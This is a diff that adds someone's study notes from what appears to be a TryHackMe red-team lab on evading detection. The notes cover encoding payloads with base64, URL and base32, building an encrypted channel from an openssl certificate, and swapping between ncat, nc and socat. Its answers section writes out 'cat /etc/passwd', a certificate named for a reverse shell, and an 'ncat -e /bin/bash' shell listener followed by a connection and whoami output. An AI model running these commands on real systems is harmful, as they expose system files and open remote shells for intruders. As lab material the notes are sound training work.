@@ -116,3 +116,46 @@ FIN - Finish
 -(-S) TCP SYN, (-A) ACK, (-P) PUSH, (-U) URG, (-F) FIN, (-R) RST flags
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Evasion via payload manipulation
+1. Obfuscate and Encode the payload
+-encode to Base64
+base64 payload.txt
+-url encoding
+urlencode payload.txt
+-use escaped code
+icyberchef.com
+
+2. use encrypted communication channel ( create key, listen on attacker machine, connect to attacker machine)
+-returns key and certificate
+-.pem (privacy enchanced mail) - requires concatenated private key and certificate
+
+3. Modify the data
+-modify the command
+-extra spaces or using nc or socat instead of ncat
+
+answers:
+1. echo cat /etc/passwd > testfile.txt
+base64 test_file.txt
+Y2F0IC9ldGMvcGFzc3dkCg==
+
+2. echo NZRWC5BAFVWCAOBQHAYAU=== > testfile2.txt
+base32 --decode testfile2.txt
+ncat  -l 8080
+
+3. openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+cat thm-reverse.crt
+-----BEGIN CERTIFICATE-----
+
+4. cat thm-reverse.key
+-----END PRIVATE KEY-----
+
+5. http://[IP]:8080
+ncat  -lvnp    1234  -e /bin/bash
+ncat [IP] 1234
+whoami
+redteamnetsec
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
